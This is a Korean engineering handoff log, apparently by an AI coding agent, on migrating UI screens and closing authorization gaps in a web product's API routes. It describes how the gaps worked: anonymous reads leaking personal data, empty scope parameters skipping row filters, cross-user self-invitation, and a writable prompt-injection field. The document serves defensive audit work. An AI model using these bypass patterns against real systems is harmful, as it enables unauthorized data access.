| E2E-03 표시 | ✅ 「⏸ 사람 대기 · 내 승인이 필요합니다」 |
| WBS 요약 합계 | ✅ 완료 2 + 사람 대기 1 + 진행 0 + 대기 2(차단 1) = 5 |
| 초안 보존 | ✅ 화면 전환 후 입력 동일 |
| Export | ✅ **종전과 같은 엔드포인트**가 `application/zip` 21,947 bytes 반환 |
| 수정 요구 | ✅ Dock 승인과 **다른 칸** — 하나는 멈춰 선 결정에 답하는 것, 다른 하나는 새 작업을 만드는 것 |
| 1280×720 · 1440×900 | ✅ 가로 넘침 0 · 12px 미만 0 · Canvas↔Dock 겹침 0 |

### 오프라인 검증 (2026-08-08) — **여기서 1건 더 나왔다**

§8 시각 게이트의 「오류·오프라인·복구 실패 화면을 실제 캡처로 검토한다」 중 **LLM 없이 만들 수
있는 상태부터** 닫았다. 백엔드를 내린 채 [Release 저장] 을 누르니:

    Release 를 저장하지 못했습니다. 산출물이 아직 준비되지 않았거나 권한이 없습니다.

**둘 다 아니다** — 서버에 닿지 못한 것이다. 이 문구를 본 사용자는 산출물과 권한을 확인하러
가고 거기엔 아무 문제가 없다. 원인은 `store.saveRelease` 가 네트워크 오류·403·409·500 을
**`null` 하나로** 뭉갠 것이고, 호출부는 이유를 알 수 없어 **그럴듯한 문장을 지어 썼다.**
트랙 F 에서 여덟 화면에 걸쳐 고친 것과 같은 유형이다.

★ **`tsc` 가 잡지 못한 자리**: 호출부는 `const rid = await saveRelease(...); if (rid)` 였다.
객체는 **항상 truthy** 라 반환 타입만 바꾸고 호출부를 뒀다면 오프라인에서 «저장되었습니다»
라고 말하는, 지금보다 나쁜 상태가 됐다. 두 호출부를 함께 고쳤다.

| 오프라인 항목 | 결과 |
|---|---|
| SSE 끊김 표시 | ✅ 헤더가 「test_a1_unitconv · **재연결 중**」 |
| Jarvis 응답 실패 | ✅ 「비서 응답을 받지 못했습니다: Failed to fetch」 |
| 복구 버튼 | ✅ 「마지막 실행 실패 기록이 없습니다」로 비활성 + 이유 표시 |
| **Release 저장 실패 문구** | ❌ → ✅ 「서버에 연결하지 못했습니다 — 산출물이나 권한 문제가 아닙니다」 |
| 백엔드 복구 후 | ✅ 재연결 · 전환 게이트 항목 전부 정상 |

### ⚠️ 승격하지 않는다 — 사용자 결정: **카나리 유지** (2026-08-08)

§8 이 「승격 전 기존 3패널은 즉시 되돌릴 수 있게 유지」를 요구하고, 게이트는 통과했지만
**아직 확인하지 못한 화면 상태가 남아 있다.** 그래서 「🏗 새 작업공간」 버튼으로만 들어가는
지금 상태를 유지하고 실사용 피드백을 더 받는다.

**승격 조건 3가지**
1. **요구 확인 «대기»·복구 실패 화면**을 실제 프로젝트로 확인 — 그 상태의 프로젝트가 없고
   만들려면 **스프린트를 돌려야 한다(LLM 비용 · 사용자 승인 사안)**.
2. 카나리 실사용 피드백.
3. 승격 시 「종전 통제실로」 되돌림 경로 유지(이미 있다).

⚠️ **이 저장소가 여러 번 겪은 「한 상태에서만 확인한 것이 다른 상태에서 틀렸다」가 아직
유효하다** — 게이트는 `test_a1_unitconv` 한 프로젝트로 돌렸다.

완료 게이트 **15개**(명세 §8): 기능 4 · 신뢰성 4 · 시각 4 · 전환 3. 각 단계의 완료 조건이며
별도 항목으로 세지 않는다. ⚠️ **착수 조건**: 데이터·권한 이관의 활성 파일 작업 종료 + Factory
변경 범위를 보드에 선언. ⚠️ **금지**: 기존 3패널 선삭제, 코드를 기본 산출물로 되돌리기,
Concept A~D 로 회귀, Mock 데이터로 완료 처리.

## F. 화면 이관 추가 8화면 — **8/8 완료** (2026-08-07)

사용자가 «미이관 10개 화면 전부 이관» 을 승인했고, 그중 2개(런처·프로젝트)는 C 에 들어갔다.
남은 8개를 작은 것부터 처리했다.

| # | 화면 | 커밋 | 이관이 실제로 고친 것 |
|---|---|---|---|
| 1 | 운영 계기판 | `4f086b127` | `.catch(() => setData(null))` — **403·장애·500 을 전부 「호출 0건」으로** 표시 |
| 2 | 프로그램 사용여부 | `05b8f8dbd` | 의존 대상을 끊는 「사용 중단」에 **확인 단계 없음** |
| 3 | Shadow Mode | `117ac6300` | 조회 실패가 「등록된 run 이 없습니다」 · 두 오류가 한 변수에 덮어써짐 |
| 4 | 크로스워크 | `52dff84ee` | **`r.ok ? r.json() : { data: [] }`** · `alert()` 7 · `prompt()` 1 · 자체 `API_BASE_URL` |
| 5 | 워크스페이스 | `1156430a7` | 조회 실패가 「공유 없음」·「복제 없음」 · **반려 사유 하드코딩** |
| 6 | 경영계획 | `42ffab9e2` | **주석이 «조용한 거짓말» 이라 부른 결함이 실패 경로에 그대로** |
| 7 | 미리보기 | `7b41e3cff` | 전체화면에 모달 의미론 없음 · 팝업 차단 `alert()` |
| 8 | 상담사 | `2ef4ed813` | **「무엇을 안고 승인하는지」를 승인 후에 알려줌** · 결정 이력 `.catch(() => [])` |

### ★★★ 이관은 겉모습 교체가 아니었다 — 8개 중 7개에서 «조용한 거짓말» 이 나왔다

같은 결함이 화면마다 다른 옷을 입고 있었다: **조회 실패를 «0건»·«없음» 으로 보여주는 것.**
백엔드는 이번 세션 내내 `Metric`(값 + «읽었는가»)으로 이것을 막아 왔는데, 화면이 그 구분을
지우면 백엔드가 지킨 것이 소용없어진다. 8개 전부 `Loaded<T>` 로 바꿨다.

**가장 아팠던 것**(6번): 그 파일의 주석이 스스로 「화면은 "등록된 시나리오가 없습니다" 라고
말하는데 실제로는 3건이 있었다 — 조용한 거짓말이다」라고 적어 두고, **바로 아래 줄에서**
`s.status === 'fulfilled' ? s.value : []` 를 하고 있었다. 한 입구를 막고 다른 입구를 열어 둔 것이다.

### 함께 고친 것

  · 손으로 만든 모달 7개 → `HubDialog`(`role=dialog`·`aria-modal`·포커스 트랩·Escape·배경 inert).
    ⚠️ 미리보기만 예외 — `createPortal` 이 **iframe 을 재마운트**해 실행 중인 생성 앱이 죽는다.
    그 자리에서 모달 의미론만 갖췄고, iframe 이 같은 DOM 노드로 남는 것을 실측했다.
  · `alert()` 9곳 · `prompt()` 1곳 제거 — 되돌리기 어려운 행동 8곳에 `ConfirmInline` 을 달았다
    (사용 중단 · 전사 승격 · 롤백 · 공유 회수 · 매핑 확정 · 청사진 승인 · 반려 · LLM 보강).
  · **9~11px 글자 105곳** → 본문 12px 이상(감사 UIUX-AUDIT-29 ③)
  · 데이터 계층 4곳(`shadowApi`·`workspaceApi`·`planningApi`·신규 `crosswalkApi`)이 상태 코드를
    실어 던지도록 통일 — 그러지 않으면 화면이 «권한 없음» 과 «서버 장애» 를 구분할 수 없다.
  · 디자인 시스템에 `.afs-table`·`.afs-table-wrap`·`.panel-body` 추가(각자 만들면 4벌이 된다).

### 검증

화면 8개 전부 **살아 있는 서버**(프론트 5175 + 백엔드 8081)에서 확인했다 —
`role=dialog`·`aria-modal`·`root[inert]` · 12px 미만 0건 · 가로 넘침 0 · 실데이터 렌더.
**장애 경로도 눌러 봤다**: 백엔드를 내린 상태에서 「조회 불가 — «0건»이 아닙니다」가 나오고,
되살린 뒤 [다시 시도] 로 회복되는 것을 확인했다(4·6번).

⚠️ **누르지 않은 것**: 승인·승격·롤백·회수·매핑 확정·LLM 보강. 운영 상태를 바꾸거나 쿼터를
쓰는 행동이다. 상담사의 승인·반려는 저장소의 청사진이 전부 승인 상태여서 **버튼 자체가
뜨지 않았다**(draft 를 만들려면 새 상담 = DB 쓰기). `ConfirmInline` 쌍이 실제로 열리는 것은
2·4·5번 화면에서 확인했다.

---

## G. 잔여 라우트 봉합 — **16/16 완료** (2026-08-07)

**익명은 이제 이 16개 파일에서 아무것도 받지 못한다.** 게이트 `tests/test_track_g_route_sealing.py`
가 16개 라우터를 전수 순회해 126검사를 돌린다.

### 후반 10개 파일 (2026-08-07)

| 파일 | 봉합 | 성격 |
|---|---:|---|
| `enterprise_context_control` | 3 | `meta`·`copy-policy`·`evidence-kinds` |
| `glossary_control` | 3 | `terms/expand`·`match`·`terms/{id}` |
| `program_control` | 3 | 프로그램 목록·상세·`usable` |
| `readiness_control` | 3 | `checklist`·`rollbacks`·`impact` |
| `shadow_control` | 3 | `summary`·`runs/{id}`·`compare` |
| `reference_control` | 2 | `summary`·`scan` |
| `factory_control` | 2 | `logs`·`library/list` |
| `advisor_control` | 1 | `playbooks` |
| `jarvis_control` | 1 | `context-contract` |
| `ledger_control` | 1 | `event-types` |

★ **«스키마·자기상태» 를 예외로 두지 않았다.** `ledger/event-types`·`jarvis/context-contract`
같은 것은 열어 둬도 된다는 주장이 가능하지만, **이 제품에는 익명 인격이 없다** —
`ORG_DEFAULT_USER_ID` 는 빈 문자열이고 로그인하지 않은 사람이 볼 화면이 없다. 예외를 만들면
그 예외 옆에 다음 예외가 붙고, 「이건 스키마니까」는 검증할 수 없는 판단이다.

### ★★ 봉합 중 낸 사고 — 내 테스트가 LLM 비용을 썼다

16개 라우터 전체에 **쓰기 탐침**을 돌렸더니 `POST /factory/{pid}/supervisor/chat`·`/heal`·
`/sprint/revision` 이 **실제로 실행됐다.** 로그에 Gemini 호출과 「Sprint Loop Cancelled」가
찍혔다. DB·파일은 `tmp_path` 로 격리돼 있었지만 **LLM 호출은 격리되지 않는다.**

⚠️ 「테스트 격리」를 파일·DB 로만 생각한 것이 틀렸다. → 익명 GET 탐침은 전 라우터에 돌리되,
쓰기 탐침은 `WRITE_PROBE_ROUTERS` 에 **명시적으로 올린 라우터만** 찌른다. 올리기 전에
「이 파일의 쓰기를 눌러도 바깥으로 나가는 것이 없는가」를 한 번 답해야 한다.

---

### 전반 6개 파일 (2026-08-07)

| 파일 | 무방비였던 것 | 봉합 |
|---|---:|---|
| `benchmark_control.py` | 6 / 6 | 읽기 3 = 식별 · `evaluate`·`human-score` = `model.policy.manage` · `promote-golden` = `system.default.edit` |
| `format_control.py` | 4 / 4 | 읽기 = 식별 · 쓰기 3 = `system.default.edit`(전역 공유 파일) |
| `crosswalk_control.py` | 9 / 14 | **쓰기 9 전부** = `admin.data_access` |
| `workspace_control.py` | 5 / 12 | **읽기 5 전부** = 식별 |
| `lineage_control.py` | 4 / 8 | 읽기 4 = 식별 |
| `connector_control.py` | 3 / 8 | 읽기 3 = 식별 · **추가로 쓰기 3** = `admin.data_access` |

**★ 두 파일이 정확히 반대 모양이었다.** `crosswalk` 는 읽기 5개가 전부 막혀 있고 쓰기 9개가
전부 무방비였다 — 익명이 시스템을 삭제하고 CSV 로 스키마를 들여오고 **제안을 승인**할 수 있었다
(매핑은 승인해야 `confirmed=1` 이 되므로, 그것이 곧 «외부 필드 = 우리 표준의 무엇» 을 확정하는
행위다). `workspace` 는 그 반대로 쓰기 7개가 막히고 읽기 5개가 열려 있었다.
⚠️ **한쪽만 훑는 점검은 두 파일 모두에 초록을 준다.**

### ★ 무방비 목록에 없던 결함 — `connector` 쓰기 3개

`POST /connectors` · `/{id}/activate` · `/{id}/contracts` 는 `Principal` 을 **받고 있어서**
라우트 점검에서 «통제됨» 으로 세어졌다. 그런데 받기만 하고 권한을 보지 않아 **viewer 계정으로
커넥터를 등록·활성화하고 Query Contract 를 추가할 수 있었다.** 게이트의 2차 검사(«식별만으로
열리는 쓰기가 없다»)가 잡았다 — 400 응답은 인가를 지나 업무 검증까지 도달했다는 뜻이다.

⚠️⚠️ **«주체를 받는가» 와 «권한을 보는가» 는 다른 질문이다.** 전자만 세면 절반이 초록으로
보이고, 그 절반은 익명 검사만으로는 영원히 드러나지 않는다. → 트랙 G 의 분모(무방비 16파일)는
**최소치**이며, 「Principal 은 받지만 권한은 안 보는」 라우트는 아직 전수 조사되지 않았다.

### ⬜ 이번 봉합이 **하지 않은** 것

`workspace`·`lineage` 의 읽기에는 **범위 필터가 없다** — 식별된 사용자에게는 남의 부서 공유·
승격 기록과 계보가 그대로 보인다. 행 단위 필터(`viewer_scope_nodes`)를 저장소까지 내려야 하는
일이라 라우트 봉합의 몫이 아니다. **봉합은 «익명이 못 본다» 까지이고 그 이상을 완료로 세지 않는다.**

**먼저 한 일 — 판정을 한 곳으로 올렸다.** `planning_control._assert_identified`·`_eul` 을
`api/deps.assert_identified`·`eul` 로 옮겼다. 16개 파일에 헬퍼를 복사하면 판정이 열일곱 벌이
되고 그중 하나만 고쳐지는 날이 온다 — 인계서가 여덟 번 기록한 결함 유형이다.

**게이트: `tests/test_track_g_route_sealing.py`** — 목록이 아니라 **라우터 객체를 순회**한다.
`READ_PATHS` 에 `/facts` 가 빠져 익명 유출을 통과시킨 일이 있었으므로, 파일을 등록하면 그
파일의 **모든** 라우트가 자동으로 검사 대상이 된다.

### ★ 게이트가 곧바로 잡은 것 2건

1. **`GET /api/v1/factory/formats` 가 익명에게 200** — 서식 정의 전체(`prompt_injection` 본문
   포함)를 줬다. 그 문자열은 **모든 에이전트 프롬프트에 그대로 주입**되고, 쓰기 3개도 무방비라
   익명이 문장을 심을 수 있었다. 「설정 API」가 아니라 프롬프트 주입 통로였다.
2. **FastAPI 는 본문 검증을 인가보다 먼저 한다.** 빈 본문 POST 는 422 를 내는데, 그것을
   「막혔다」로 세면 **인가 검사는 한 번도 실행되지 않은 채 초록**이 된다. 공격자는 올바른
   본문을 보낸다 — 그래서 게이트가 요청 모델을 읽어 **검증을 통과하는 최소 본문**을 만들어
   보낸다. 422 는 통과가 아니라 «검사 도구 결함» 으로 따로 실패시킨다.

---

### (아래는 2026-08-05 병합 후 실측 — 착수 전 현황)

**작업 단위를 «파일» 로 센다.** 같은 파일의 라우트는 같은 판정 헬퍼를 쓰므로 한 번에 봉합된다
(`planning_control` 14개를 한 단계에 봉합했다). 라우트를 개별로 세면 분모가 왜곡된다.

### 분류 근거 — 익명으로 **실제 호출**해 확인했다(GET 만, 쓰기는 코드로만 판단)

| 결과 | 개수 | 뜻 |
|---|---:|---|
| 열림(데이터 있음) | **29** | 이미 유출 중. `org/users` **22명 PII** · `org/departments` 12 · `catalog/governance/coverage` 15 · `crosswalk/systems/coverage` 15 · `skills/proposals` 18 · `external/readiness` 6 … |
| 열림(빈 응답) | **26** | 지금 0건이지만 **데이터가 들어오면 유출**된다 — 경영계획에서 하루 만에 그렇게 됐다 |
| **차단** | **0** | ⚠️ 무방비 GET 64개 중 **하나도 익명을 막지 않는다** |
| 파라미터 부족(판정 불가) | 9 | 파라미터를 주면 열릴 것 |
| 쓰기(POST/PUT/DELETE) | 30 | 운영 DB 를 향한 쓰기 탐침 금지 — 코드로만 판단 |

`dev` 무방비 **94** 라우트 / 전체 381. 즉 **의도적 공개는 사실상 없었다** — 「분류하면 대부분
공개일 것」이라는 예상이 틀렸다.

### 병합(C)이 해결한 몫 — **실측 완료(2026-08-05, 병합본 기준)**

| 파일 | dev | 브랜치 | 병합 결과 |
|---|---:|---:|---:|
| `external_control` · `org_control` · `standard_control` · `contract_control` · `catalog_control` · `skill_control` | 6·6·6·4·3·3 | **0** | **0** ★ 해결 |
| `crosswalk_control` | 13 | 9 | 9 |
| `factory_control` | 11 | 2 | **2** (아래 ⚠️ 참조) |
| `benchmark`·`workspace`·`format`·`lineage`·`connector`·`enterprise_context`·`glossary`·`program`·`readiness`·`shadow`·`reference`·`advisor`·`jarvis`·`ledger` | 6·5·4·4·3·3·3·3·3·3·2·1·1·1 | 동일 | 동일 |
| **합계** | **94** | — | **53 남음** (41 해결) |

→ **트랙 G = 병합 후에도 무방비인 16개 파일 · 53 라우트.** 파일 단위 **16개**를 분모로 센다.

| 파일 | 무방비 / 전체 |
|---|---:|
| `crosswalk_control.py` | 9 / 14 |
| `benchmark_control.py` | **6 / 6** (전량 — `POST /{id}/promote-golden` 이 골든셋을 바꾼다) |
| `workspace_control.py` | 5 / 12 |
| `format_control.py` | **4 / 4** |
| `lineage_control.py` | 4 / 8 |
| `connector_control.py` | 3 / 8 |
| `enterprise_context_control.py` | 3 / 47 |
| `glossary_control.py` | 3 / 10 |
| `program_control.py` | 3 / 7 |
| `readiness_control.py` | 3 / 4 |
| `shadow_control.py` | 3 / 9 |
| `reference_control.py` | 2 / 7 |
| `factory_control.py` | 2 / 42 |
| `advisor_control.py` | 1 / 12 |
| `jarvis_control.py` | 1 / 2 |
| `ledger_control.py` | 1 / 4 |

### 병합 후 익명 실측 — 파라미터 없는 GET 109개 (2026-08-05)

| 결과 | 수 | 비고 |
|---|---:|---|
| 차단(401/403) | **38** | |
| 200 · 빈응답 | 28 | 행 필터가 걸려 비었다 — 데이터가 들어오면 다시 봐야 한다 |
| **200 · 자료 있음** | **26** | ⚠️ 확인 대상. `dev` 29 → 26 (병합으로 3 감소) |
| 그 외(주로 422 파라미터 부족) | 17 | **차단이 아니다** — 값을 채우면 열릴 수 있다 |

★★★ **여기서 실제 유출 하나를 잡았다.** `GET /api/v1/planning/facts` 가 익명에게 경영계획
사실 **20건(금액 포함)** 을 줬다. 같은 라우터의 다른 GET 5개는 404(범위 은폐)로 막히는데
가장 민감한 하나만 열려 있었다. 원인은 두 겹이다.

1. **`_assert_identified` 를 부르지 않았다.** 30개 라우트 중 17개가 그랬다(대부분은 범위
   판정에 걸려 우연히 막혀 있었다 — 「막혀 있으니 통제가 있다」가 아니다).
2. **빈 범위 요청이 통제를 우회한다.** `org_id`·`scope_node_id` 를 비우면
   `assert_scope_allowed` 는 «전사 요청» 으로 보고 정규화할 대상이 없어 통과시키고, 저장소로
   넘어가는 범위도 빈 값이라 행 필터가 걸리지 않는다. 즉 **파라미터를 주지 않는 것이 가장 넓은
   조회**다. 「범위를 명시하면 거부된다」만 확인하면 이 경로를 못 본다.

→ 17개 전부에 식별 확인을 넣었고, `tests/test_planning_control_gate.py` 의 `READ_PATHS` 에
`/facts` 외 5개를 추가했다. 그 목록이 손으로 관리되는 것이 애초 누락의 원인이었으므로
**라우터를 읽어 누락을 잡는 테스트**(`test_every_planning_get_is_covered_here`)를 더했다.

⚠️ 26개를 그대로 «구멍 26개» 로 읽지 말 것. 검산해 보니 성격이 갈린다 —
`/org/me`(익명에게 **자기 자신의 빈 권한 상태**를 준다. 화면이 로그인 안내를 띄우려면 필요하다),
`/ledger/event-types`·`/enterprise-context/copy-policy`·`/competitors/evidence-kinds`·
`/jarvis/context-contract` 처럼 **스키마·열거형·정책 상수**인 것들은 정상 공개 후보다.
업무 자료가 나가는 쪽은 `/advisor/*`·`/benchmark/scenarios`·`/enterprise-context/entities`·
`/shadow/*`·`/workspace/*`·`/telemetry/*`·`/reference/summary` 다. **분류가 트랙 G 의 첫 작업**이다.

⚠️ **이 수를 「구멍의 전부」로 읽지 말 것.** 세는 기준은 «라우트가 `Principal` 을 받는가» 이고,
그것은 «판정을 하는가» 와 다르다. 병합 검증에서 `GET /projects` 가 정확히 그 틈에 있었다 —
주체를 받아 놓고 익명 여부를 보지 않아 프로젝트 목록이 그대로 나갔다. 반대 방향 오탐도 있다:
판정을 헬퍼에 위임하는 라우트(`create_asset(..., p)`·`visible_tree(p, ...)`)는 자동 점검이
«판정 없음» 으로 읽는다. **정규식으로 판정 유무를 판별하려는 시도는 실패했다**(상한 21개를
뽑아 검산했더니 대부분 오탐이었다). 그래서 트랙 G 는 파일을 열어 읽고, 테스트로 고정한다.

⚠️ **병합 검증에서 실제로 잡은 결함 2건**(둘 다 «충돌 마커 0건» 이어서 눈에 띄지 않았다):

1. **`api/deps.py` — 같은 이름이 두 벌 남았다.** 양쪽이 `_EXACT_COUNT_RULES` 와
   `hidden_envelope` 를 각자 추가했고, 위치가 달라 git 은 충돌로 보지 않았다. 뒤에 온 정의가
   앞을 덮어 **`plan` 규칙만 조용히 사라졌다**(경영계획 건수 공개 판정). 테스트 7건이 깨져서야
   드러났다.
2. **`factory_control.py` — 충돌을 dev 쪽으로 해결해 브랜치 통제 9개를 잃었다.** 그중
   `POST /{project_id}/hotl/resume`(사람 확인 중단점 재개)가 있었다 — 무방비면 남의 프로젝트
   중단점을 아무나 통과시킨다. 사용자 규칙 「충돌은 더 엄격한 쪽」에 따라 9개 전부 복원했고,
   브랜치에만 있던 `_assert_agent_config_readable`(LLM 호출 라우트 보호)도 함께 가져왔다.

→ 그래서 병합 검증은 **세 가지를 따로** 본다: ① 같은 이름이 두 번 정의됐는가 ② 한쪽에서
통제되던 라우트가 무방비가 됐는가 ③ 한쪽의 정의·라우트가 사라졌는가. ②③은 37개 라우트 파일
전수에서 **0건**을 확인했다. 스위트 통과만으로는 ①을 못 잡는다(테스트가 그 경로를 부르지 않으면
조용하다).

⚠️ **측정 함정 하나**: 처음 브랜치 대조에서 «브랜치 무방비 0» 이 나와 «병합이 전부 해결한다» 는
결론을 낼 뻔했다. 실제로는 `git show` 가 **경로 구분자(`\`) 때문에 37개 파일 전부 읽기 실패**해
0 이 된 것이었다. 검증하지 않았으면 틀린 결론을 보고했을 것이다 — 「0 이 나왔다」와 「못 읽었다」를
구분해야 한다.

---

## H. 식별만으로 열리는 쓰기 — **65/65 완료** (2026-08-08)

### ★ 권한 배정표 — `core/route_authority.py`

**표를 문서가 아니라 코드로 두었다.** 문서로 두면 코드와 갈라진다(이 저장소가 아홉 번 겪었고,
트랙 G 도 손으로 관리하던 `READ_PATHS` 에 `/facts` 가 빠져 익명 유출을 통과시켰다).
라우터에 **한 줄**만 더하면 그 라우터의 모든 요청이 표를 지난다:

```python
router = APIRouter(prefix="...", dependencies=[Depends(_route_authority_guard)])
```

`tests/test_route_authority_table.py` 가 표와 라우터를 **양방향으로** 대조한다 —
① 표에 있는데 라우트가 없다(오타로 «없는 라우트» 를 막고 있다) ② 라우트가 있는데 표에 없다.

### 새 권한 코드 4개 — 제품의 핵심 객체에 코드가 없었다

Agent·Workflow·Skill·Model 에는 있는데 **프로젝트에는 하나도 없었다.** 그래서 프로젝트
라우트 20개가 「Principal 을 받으니 통제됨」으로 세어졌다.

**되돌리기 비용**이 다른 지점에서 끊었다:

| 코드 | 무엇이 다른가 | 라우트 |
|---|---|---:|
| `project.create` | 되돌리기 쉽다(빈 프로젝트) | 4 |
| `project.run` | LLM 비용이 나가고 되돌릴 수 없다 | 13 |
| `project.edit` | 남의 자료를 끌어온다(지식·기준정보·소유권) | 3 |
| `project.release` | **남에게 나간다.** 회수해도 이미 본 사람이 있다 | 7 |

역할 배정: viewer 없음 · **member = create·run·edit** · manager = 넷 다 · AI 관리자 = 넷 다.
★ member 에서 `release` 를 뺀 기준은 Agent 에서 `publish` 를 뺀 것과 같다.
★ 소유권 변경(`PUT /{pid}/ownership`)만 `project.edit` + `admin.organization` **둘 다** 요구한다 —
소유자를 자기로 바꾸면 자원별 판정이 전부 통과하므로, **표 자체를 무력화할 수 있는 행위**다.

### 살아 있는 서버 실측 (8081, 2026-08-07)

```
POST /factory/projects        viewer 403 · member 200 · manager 409(중복 — 인가는 통과)
POST /factory/{pid}/release   viewer 403 · member 403 · manager 404(산출물 없음 — 인가는 통과)
```
**member 가 만들지만 게시하지 못한다** — 계층이 이름만이 아니라 실제로 나뉘어 있다.

### ★★ 표를 붙이며 낸 결함 3건 (전부 테스트가 잡았다)

1. **`guard(request)` 에 타입 표기를 빼먹었다.** FastAPI 가 이것을 쿼리 파라미터 `?request=`
   로 읽어 **그 라우터의 모든 요청이 422** 가 됐다. 통제를 붙이려다 라우터 전체를 못 쓰게
   만들 뻔했다.
2. **권한 강제 스위치를 무시했다.** 이 저장소의 다른 판정은 전부 「강제가 꺼져 있으면 막지
   않는다」는 하위호환 계약을 지키는데 표만 예외였다. 전체 테스트 15건이 깨졌고, 증상은
   「혼자 돌면 통과, 전체로 돌면 401」이었지만 원인은 순서가 아니라 **계약 위반**이었다.
3. **주체를 `Depends` 가 아니라 직접 해석했다.** `app.dependency_overrides` 를 지나쳐
   **미등록·폐지 계정이 익명으로 보였다**(403 이어야 할 자리에 401). 막히긴 했으므로 더
   위험하다 — 통제는 작동하는데 **이유가 틀렸고**, 틀린 이유는 사용자를 엉뚱한 조치로 보낸다.

### 감지선이 울렸고, 변경은 의도한 것이다

`test_unowned_project_stays_permissive_for_identified_users` 는 「하위호환 계약이 조용히
바뀌었다 — 의도한 변경이면 이 주석을 고칠 것」이라고 적어 둔 감지선이었다. 울렸고 고쳤다.
**소유권 미기록 프로젝트의 관대함은 그대로 두되, 「이 사람이 프로젝트를 돌릴 수 있는가」를
앞에 세웠다.** 두 판정은 다른 질문이고 둘 다 필요하다.

실제 사용자에게 영향 없음(실측): manager·member 는 `project.run` 을 갖고 viewer 만 갖지 않는다.

### ⚠️ 「남은 4건」은 **틀린 숫자였다** — 실측 28건 (2026-08-08)

종전 기록은 표가 다루는 **7개 라우터**만 보고 4건이라 적었다. 전체 라우터를 같은 방식으로
훑으니 **식별만으로 열리는 쓰기가 28건** 남아 있었다.

| 파일 | 건수 | 성격 |
|---|---:|---|
| ~~`decision_control`~~ | ~~8~~ → **0** | **2026-08-08 봉합**(아래) |
| ~~`publication_control`~~ | ~~7~~ → **0** | **2026-08-08 봉합**(아래) |
| `app_delivery_control` | 6 | 앱 전달 — **저장소 층에 당사자 판정이 있다**(`test_collaboration_scope_security` 13건이 «남의 것은 404» 를 지킨다). 라우트에 표식이 없을 뿐이다 |
| `admin_control` | 3 | 감사 정리·권한 강제 스위치·기한 |
| `sandbox_control` | 2 | 토큰 발급·회수 |
| `agent_governance` | 1 | `skills/propose` |
| `telemetry_control` | 1 | `quality/classify` |

⚠️ **분모 계산**: 종전 37(봉합) + 재실측 28(잔여) = **65**. 발간 7건을 봉합해 **44/65** 가 된다.
   ★ 처음에 `44/71` 이라 적었다가 검산에서 틀린 것을 잡았다 — **유도 없이 적은 숫자였다.**
     진척은 세는 것이지 어림하는 것이 아니다(이 파일 머리말의 규칙).

★ **이 표 자체가 트랙 H 가 존재하는 이유다** — 「Principal 을 받으니 통제됨」으로 세면
  숫자가 맞아 보이고, 실제로 무엇이 열려 있는지는 아무도 모른다.

### ★★★ 발간 계열 봉합 — 남의 대외 발간물을 내보낼 수 있었다 (2026-08-08)

격리 저장소 실측:

```
생성자 = kim · 대외 발간물(EXTERNAL)
남남이 조회 → 성공 · 남남이 법무승인 → 통과 · 남남이 경영승인 → 통과 · 남남이 대외발간 → 통과
```

원인은 `Publication.get(id, user_id)` 이 `user_id` 를 **받고도 쓰지 않은 것**이다. 판정이
아예 없었다. 기존 테스트 33건은 **절차 게이트**(렌더→승인→발간, 대외 이중 검토)만 봤고
교차 사용자 접근은 **한 건도 없었다** — 절차가 옳아도 «누가» 가 비어 있으면 통제가 아니다.

→ `get()` 을 **단일 판정 지점**으로 삼는다(render·approve·publish·correct·withdraw 가 전부
  여기를 지난다). 거부는 **404 은폐**. 목록·생성 입구도 함께 막았다.

**★ «이중 승인의 사람 분리» 는 하지 않았다 (사용자 결정 2026-08-08).**
실측: 활성 12개 부서에 `legal` 이 **없고** 1인 부서가 넷이다. 강제하면 대외 발간이 `hq` 6명·
실질 관리자 3명에게 몰리고 휴가·부재 대행이 막힌다 — 막힌 흐름은 «승인 계정 돌려쓰기» 로
우회되며 그러면 기록만 더 나빠진다.
위험했던 것은 「한 사람이 두 번 눌렀다」가 아니라 **「관계없는 사람이 건드렸다」** 였다.

검증: 재실측에서 남남 조회·승인·발간·목록 **전부 404 은폐** · 관계자·작성자·관리자 통과.
신규 16건 · **변이 검사(판정 끄기) → 9건 실패** · 기존 33건 무변경 통과.

### ★★★ 의사결정 안건 봉합 — 머리말이 규정한 404 가 **구현돼 있지 않았다** (2026-08-08)

`api/routes/decision_control.py` 머리말은 「참여자가 아닌 안건 → **404**」를 규정한다.
**그 판정이 없었다.** 발간과 같은 날 같은 유형이다 — 규약이 문서에만 있고 구현에 없으면
그것은 규약이 아니다.

```
안건 생성자 = kim (MNM_BATTERY)
남남이 조회    → 성공 — 패키지·참여자·회의가 전부 보인다
남남이 뷰 렌더  → 통과
남남이 검토요청 → 통과      ← 남의 안건에 참여자를 임의로 추가한다
남남이 회의소집 → 통과
남남이 참여응답 → 404 은폐   ← 이 둘만 my_role 을 봤다
남남이 결정    → 404 은폐
```

★★ **검토요청이 가장 나빴다.** 참여자가 되면 그 사람은 이후 그 안건을 계속 볼 수 있다 —
이 한 경로가 가시성 판정 전체를 무력화하는 **«스스로 초대하기»** 였다.

→ 발간과 **같은 모양**으로 `get()` 을 단일 판정 지점으로 삼았다(7개 변경 메서드가 전부
  여기를 지난다). 판정: 작성자 · **참여자** · 조직 범위 · 무제한 주체.

★ **참여자를 판정에 넣은 이유**: 안건은 여러 부서가 함께 본다. 다른 부서가 나를 검토자로
  지정했는데 범위만 보면 **내가 그 안건을 못 보고**, 답할 일이 있다는 것조차 알 수 없다.

검증: 남남 **8경로 전부 404 은폐** · 관계자 4유형(작성자·참여자·같은 조직·관리자) 전부 통과 ·
관계자 전체 흐름(검토요청→참여응답→결정) 그대로 동작 · 신규 15건 ·
**변이 검사(판정 끄기) → 5건 실패** · 기존 35건 무변경.

### 남은 것 — 재검산 (2026-08-08)

`EXEMPT` 에 이유와 함께 올린 것들(`connectors/{id}/validate` 등)과 위 표의 나머지다.
**면제는 이유 없이 존재할 수 없다** — 테스트가 빈 이유를 잡는다.
⚠️ 다음 사람은 **`app_delivery` 부터 보지 말 것** — 저장소 층에 당사자 판정이 있고 그것을
   지키는 테스트가 13건 있다. 라우트에 표식이 없을 뿐이며, 정리한다면 `EXEMPT` 에 그 이유를
   적는 일이지 봉합이 아니다.
### ★★ 스캐너를 고치니 13건이 **1건**이었다

`admin_control` 3건이 「권한 강제 스위치가 열려 있다」로 보였는데, 실제로는 `_admin(p)` →
`assert_can_edit_org(p)` 로 막혀 있었다. **판정이 로컬 헬퍼 안에 있으면 소스 스캔이 못 본다.**

→ 스캐너가 모듈 안의 헬퍼를 한 단계 따라 들어가게 고쳤더니 남은 것은 **1건**이었다.

⚠️ **이것이 이번 라운드에서 내가 세 번째로 틀린 숫자다**(37 → 28 → 13 → 1).
